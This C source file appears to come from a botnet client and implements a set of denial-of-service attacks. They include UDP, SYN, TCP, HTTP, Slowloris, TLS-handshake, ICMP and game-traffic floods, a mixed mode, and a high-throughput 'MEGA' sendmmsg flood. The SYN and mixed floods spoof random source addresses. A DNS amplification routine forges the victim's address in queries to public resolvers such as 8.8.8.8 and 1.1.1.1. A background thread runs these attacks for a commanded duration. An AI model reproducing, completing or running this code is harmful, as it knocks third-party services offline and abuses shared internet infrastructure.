#include "bot.h"

/* ── MEGA Engine (sendmmsg + mmap ring) ─────────────── */
typedef struct {
    int *socks;
    int sock_count;
    struct sockaddr_in target;
    int duration;
    int cpu_id;
    unsigned char *ring;
    struct mmsghdr *msgs;
    struct iovec *iovs;
} MegaThread;

static void *mega_worker(void *arg)
{
    MegaThread *mt = (MegaThread *)arg;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(mt->cpu_id % get_nprocs(), &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    int batch = MEGA_BATCH;
    if (get_nprocs() < 2) batch = 4096;

    mt->msgs = mmap(NULL, sizeof(struct mmsghdr) * batch,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mt->iovs = mmap(NULL, sizeof(struct iovec) * batch,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mt->ring = mmap(NULL, RING_BUF_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mt->msgs == MAP_FAILED || mt->iovs == MAP_FAILED || mt->ring == MAP_FAILED)
        return NULL;
    memset(mt->ring, 0, RING_BUF_SIZE);
    int ring_mask = RING_BUF_SIZE - 1;

    for (int i = 0; i < batch; i++) {
        mt->iovs[i].iov_base = &mt->ring[i & ring_mask];
        mt->iovs[i].iov_len = 32;
        mt->msgs[i].msg_hdr.msg_iov = &mt->iovs[i];
        mt->msgs[i].msg_hdr.msg_iovlen = 1;
        mt->msgs[i].msg_hdr.msg_name = &mt->target;
        mt->msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        mt->msgs[i].msg_hdr.msg_control = NULL;
        mt->msgs[i].msg_hdr.msg_controllen = 0;
        mt->msgs[i].msg_hdr.msg_flags = 0;
    }

    time_t start = time(NULL);
    while (time(NULL) - start < mt->duration && !g_attack_stop) {
        for (int s = 0; s < mt->sock_count; s++)
            for (int b = 0; b < BURST_MULTIPLIER; b++) {
                int r = sendmmsg(mt->socks[s], mt->msgs, batch,
                                 MSG_DONTWAIT | MSG_NOSIGNAL | MSG_ZEROCOPY);
                if (r > 0) pkt_sent(r * 32);
            }
    }
    munmap(mt->msgs, sizeof(struct mmsghdr) * batch);
    munmap(mt->iovs, sizeof(struct iovec) * batch);
    munmap(mt->ring, RING_BUF_SIZE);
    return NULL;
}

/* ── Token Bucket ───────────────────────────────────── */
static void tb_init(TokenBucket *tb, double r, double b)
{
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}

static int tb_consume(TokenBucket *tb, int n)
{
    pthread_mutex_lock(&tb->mtx);
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens = (tb->burst < tb->tokens + elapsed * tb->rate) ? tb->burst : (tb->tokens + elapsed * tb->rate);
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

typedef struct {
    AttackParams *ap;
    TokenBucket *tb;
    struct sockaddr_in ta;
    int cpu;
} WorkerArg;

static void *attack_worker(void *arg)
{
    WorkerArg *x = (WorkerArg *)arg;
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(x->cpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    if (!strcmp(x->ap->method, "UDP")) udp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "SYN")) syn_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "TCP")) tcp_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "HTTP")) http_flood(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "MIX")) mixed(x->ta, x->ap, x->tb);
    else if (!strcmp(x->ap->method, "ICMP")) icmp_flood(x->ta, x->ap, x->tb);
    else if (x->ap->slowloris || !strcmp(x->ap->method, "SLOWLORIS")) slowloris(x->ta, x->ap, x->tb);
    else if (x->ap->tls_exhaust || !strcmp(x->ap->method, "TLS_EXHAUST")) tls_exhaust(x->ta, x->ap, x->tb);
    else if (x->ap->dns_amp || !strcmp(x->ap->method, "DNS_AMP")) dns_amp(x->ta, x->ap, x->tb);
    else if (x->ap->game_mimic || !strcmp(x->ap->method, "GAME_MIMIC")) game_mimic(x->ta, x->ap, x->tb);
    else udp_flood(x->ta, x->ap, x->tb);

    free(x->ap);
    free(x->tb);
    free(x);
    return NULL;
}

/* ── Flood Workers ──────────────────────────────────── */
void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;
    int bs = 256 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    unsigned char *buf = aligned_alloc(64, MAX_PAYLOAD);
    if (!buf) { close(s); return; }
    struct iovec iov = { .iov_base = buf, .iov_len = 0 };
    struct mmsghdr msg = {0};
    msg.msg_hdr.msg_name = &ta;
    msg.msg_hdr.msg_namelen = sizeof(ta);
    msg.msg_hdr.msg_iov = &iov;
    msg.msg_hdr.msg_iovlen = 1;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < BURST_SIZE; b++) {
            if (!tb_consume(tb, 1)) { usleep(50); break; }
            if (should_pause()) { usleep(500); continue; }
            if (g_total_payloads <= 0) break;
            int idx = rand_r(&seed) % g_total_payloads;
            int len = g_payload_lens[idx];
            memcpy(buf, g_payloads[idx], (size_t)len);
            iov.iov_len = (size_t)len;
            if (sendmmsg(s, &msg, 1, MSG_DONTWAIT) > 0) pkt_sent(len);
        }
    }
    free(buf);
    close(s);
}

void syn_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_TCP);
    if (s < 0) return;
    struct { struct iphdr ip; struct tcphdr tcp; } pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.ip.version = 4; pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = ta.sin_addr.s_addr;
    pkt.tcp.dest = htons((uint16_t)p->port);
    pkt.tcp.doff = 5; pkt.tcp.syn = 1;
    pkt.tcp.window = htons(65535);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = pkt.tcp.dest;
    sin.sin_addr.s_addr = pkt.ip.daddr;
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < BURST_SIZE; b++) {
            if (!tb_consume(tb, 1)) { usleep(50); break; }
            if (should_pause()) { usleep(500); continue; }
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip() : rand_r(&seed);
            pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
            pkt.ip.frag_off = (p->fragmentation && rand_r(&seed) % 4 == 0)
                              ? htons(0x2000 | (rand_r(&seed) % 64)) : 0;
            pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
            pkt.tcp.seq = htonl(rand_r(&seed));
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
            if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)sizeof(pkt));
        }
    }
    close(s);
}

void tcp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            close(s);
            pkt_sent(1);
        }
    }
}

void http_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 30; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[2048];
            int len = 0;
            gen_http(buf, &len, p->target);
            send(s, buf, (size_t)len, MSG_DONTWAIT);
            close(s);
            pkt_sent(len);
        }
    }
}

void slowloris(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int *socks = calloc(500, sizeof(int));
    if (!socks) return;
    int cnt = 0;
    for (int i = 0; i < 500 && p->duration_secs && !g_attack_stop; i++) {
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) continue;
        fcntl(s, F_SETFL, O_NONBLOCK);
        connect(s, (struct sockaddr *)&ta, sizeof(ta));
        char ph[512];
        snprintf(ph, sizeof(ph), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", p->target);
        send(s, ph, strlen(ph), MSG_DONTWAIT);
        socks[cnt++] = s;
        usleep(50000 + (unsigned)rand() % 200000);
    }
    while (p->duration_secs && !g_attack_stop) {
        for (int i = 0; i < cnt; i++) {
            if (!tb_consume(tb, 1)) { usleep(100000); continue; }
            char h[256];
            snprintf(h, sizeof(h), "X-Ka-%d: %d\r\n", rand() % 99999, rand());
            send(socks[i], h, strlen(h), MSG_DONTWAIT);
            pkt_sent((int)strlen(h));
            usleep(10000000 + (unsigned)rand() % 15000000);
        }
        if (cnt < 500) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s >= 0) {
                fcntl(s, F_SETFL, O_NONBLOCK);
                connect(s, (struct sockaddr *)&ta, sizeof(ta));
                char ph[512];
                snprintf(ph, sizeof(ph), "GET / HTTP/1.1\r\nHost: %s\r\n", p->target);
                send(s, ph, strlen(ph), MSG_DONTWAIT);
                socks[cnt++] = s;
            }
        }
    }
    for (int i = 0; i < cnt; i++) close(socks[i]);
    free(socks);
}

void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 20; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[1024];
            int len = 0;
            gen_tls_hello(buf, &len, p->target);
            send(s, buf, (size_t)len, MSG_DONTWAIT);
            close(s);
            pkt_sent(len);
        }
    }
}

void dns_amp(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    const char *dns_svrs[] = {"203.162.4.1", "203.113.131.1", "210.245.0.11", "8.8.8.8", "1.1.1.1"};
    int s = create_raw_socket(IPPROTO_UDP);
    if (s < 0) return;
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            const char *dip = dns_svrs[rand_r(&seed) % 5];
            struct { struct iphdr ip; struct udphdr udp; unsigned char d[64]; } pkt;
            memset(&pkt, 0, sizeof(pkt));
            size_t tl = sizeof(struct iphdr) + sizeof(struct udphdr) + DNS_ANY_LEN;
            pkt.ip.version = 4; pkt.ip.ihl = 5;
            pkt.ip.tot_len = htons((uint16_t)tl);
            pkt.ip.id = htons((uint16_t)rand_r(&seed));
            pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_UDP;
            pkt.ip.saddr = ta.sin_addr.s_addr;
            inet_pton(AF_INET, dip, &pkt.ip.daddr);
            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.udp.source = htons(53); pkt.udp.dest = htons(53);
            pkt.udp.len = htons((uint16_t)(sizeof(struct udphdr) + DNS_ANY_LEN));
            pkt.udp.check = 0;
            memcpy(pkt.d, DNS_ANY_PAYLOAD, DNS_ANY_LEN);
            struct sockaddr_in sin;
            memset(&sin, 0, sizeof(sin));
            sin.sin_family = AF_INET;
            sin.sin_port = pkt.udp.dest;
            sin.sin_addr.s_addr = pkt.ip.daddr;
            if (sendto(s, &pkt, tl, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                pkt_sent((int)tl);
        }
    }
    close(s);
}

void game_mimic(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;
    int bs = 256 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    unsigned char buf[256];
    int len = 0;
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            gen_game_pkt(buf, &len);
            sendto(s, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
            pkt_sent(len);
        }
    }
    close(s);
}

void icmp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int s = create_raw_socket(IPPROTO_ICMP);
    if (s < 0) return;
    unsigned char icmp[1024];
    memset(icmp, 0, sizeof(icmp));
    icmp[0] = 8;
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 100; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            sendto(s, icmp, sizeof(icmp), MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
            pkt_sent((int)sizeof(icmp));
        }
    }
    close(s);
}

void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
{
    int us = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int rs = create_raw_socket(IPPROTO_TCP);
    if (us < 0 || rs < 0) {
        if (us >= 0) close(us);
        if (rs >= 0) close(rs);
        return;
    }
    int bs = 256 * 1024;
    setsockopt(us, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    while (p->duration_secs && !g_attack_stop) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            if (should_pause()) { usleep(500); continue; }
            int c = rand_r(&seed) % 6;
            if (c == 0 && g_total_payloads > 0) {
                int idx = rand_r(&seed) % g_total_payloads;
                sendto(us, g_payloads[idx], (size_t)g_payload_lens[idx], MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
                pkt_sent(g_payload_lens[idx]);
            } else if (c == 1) {
                struct { struct iphdr ip; struct tcphdr tcp; } pkt;
                memset(&pkt, 0, sizeof(pkt));
                pkt.ip.version = 4; pkt.ip.ihl = 5;
                pkt.ip.tot_len = htons(sizeof(pkt));
                pkt.ip.id = htons((uint16_t)rand_r(&seed));
                pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
                pkt.ip.protocol = IPPROTO_TCP;
                pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip() : rand_r(&seed);
                pkt.ip.daddr = ta.sin_addr.s_addr;
                pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
                pkt.tcp.dest = htons((uint16_t)p->port);
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.tcp.doff = 5; pkt.tcp.syn = 1;
                pkt.tcp.window = htons(65535);
                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                struct sockaddr_in sin;
                memset(&sin, 0, sizeof(sin));
                sin.sin_family = AF_INET;
                sin.sin_port = pkt.tcp.dest;
                sin.sin_addr.s_addr = pkt.ip.daddr;
                if (sendto(rs, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
                    pkt_sent((int)sizeof(pkt));
            } else if (c == 2) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[2048]; int len = 0;
                    gen_http(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT);
                    close(s); pkt_sent(len);
                }
            } else if (c == 3) {
                unsigned char buf[256]; int len = 0;
                gen_game_pkt(buf, &len);
                sendto(us, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
                pkt_sent(len);
            } else if (c == 4) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[1024]; int len = 0;
                    gen_tls_hello(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT);
                    close(s); pkt_sent(len);
                }
            } else {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    close(s); pkt_sent(1);
                }
            }
        }
    }
    close(us); close(rs);
}

/* ── Background Attack Thread ───────────────────────── */
void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    AttackParams *atk = &ctx->atk;
    time_t deadline = time(NULL) + atk->duration_secs;
    g_attack_active = 1;
    g_attack_stop = 0;
    g_pkt_count = 0;
    g_byte_count = 0;

    if (atk->mega_mode || !strcmp(atk->method, "MEGA")) {
        int cores = get_nprocs();
        int threads = cores * THREAD_MULTIPLIER;
        if (cores < 2) threads = 2;
        int max_sk = (cores < 2) ? 4096 : MAX_SOCKETS;
        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        inet_pton(AF_INET, atk->target, &ta.sin_addr);
        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            free(socks); free(tids); free(mt);
            g_attack_active = 0; free(ctx); return NULL;
        }
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 8 * 1024 * 1024);
        int spth = sock_cnt / threads;
        if (spth < 1) spth = 1;
        for (int i = 0; i < threads; i++) {
            mt[i].socks = &socks[i * spth];
            mt[i].sock_count = (i == threads - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[i].sock_count < 0) mt[i].sock_count = 0;
            mt[i].target = ta;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = i;
            pthread_create(&tids[i], &attr, mega_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);
        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    } else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        inet_pton(AF_INET, atk->target, &ta.sin_addr);
        TokenBucket tb;
        tb_init(&tb, atk->max_pps, atk->max_pps * 2.0);
        int nc = (int)atk->max_threads;
        if (nc > get_nprocs()) nc = get_nprocs();
        if (nc < 1) nc = 1;
        pthread_t *tids = malloc((size_t)nc * sizeof(pthread_t));
        if (!tids) { g_attack_active = 0; free(ctx); return NULL; }
        for (int i = 0; i < nc; i++) {
            WorkerArg *w = malloc(sizeof(WorkerArg));
            AttackParams *ap = malloc(sizeof(AttackParams));
            TokenBucket *tbp = malloc(sizeof(TokenBucket));
            if (!w || !ap || !tbp) { free(w); free(ap); free(tbp); continue; }
            memcpy(ap, atk, sizeof(AttackParams));
            memcpy(tbp, &tb, sizeof(TokenBucket));
            pthread_mutex_init(&tbp->mtx, NULL);
            w->ap = ap; w->tb = tbp; w->ta = ta; w->cpu = i % get_nprocs();
            pthread_create(&tids[i], NULL, attack_worker, w);
        }
        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
        free(tids);
    }
    g_attack_active = 0;
    free(ctx);
    return NULL;
}
